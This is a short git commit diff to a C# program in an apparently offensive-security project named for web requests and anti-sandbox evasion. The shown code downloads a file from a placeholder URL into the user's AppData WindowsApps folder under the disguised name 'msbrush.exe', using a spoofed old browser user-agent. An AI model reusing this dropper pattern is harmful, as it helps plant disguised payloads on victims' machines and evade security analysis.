38af806eda8ca9ef7f7a63d61f0b404112505dd9
Usman Sikander <76246439+Offensive-Panda@users.noreply.github.com>
2024-07-28 21:36:11 +0300

    Update Program.cs

--- Web_Request_AND_Anti_Sandbox/Web_Request_AND_Anti_Sandbox/Program.cs
+++ Web_Request_AND_Anti_Sandbox/Web_Request_AND_Anti_Sandbox/Program.cs
@@ -32,7 +32,7 @@ class Program
         {
 
             WebClient webClient = new WebClient();
-            webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " + "Windows NT 5.2; .NET CLR 1.0.3705 QatarArmedF;)");
+            webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " + "Windows NT 5.2; .NET CLR 1.0.3705;)");
             webClient.DownloadFile("URL", @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe");
 
         }
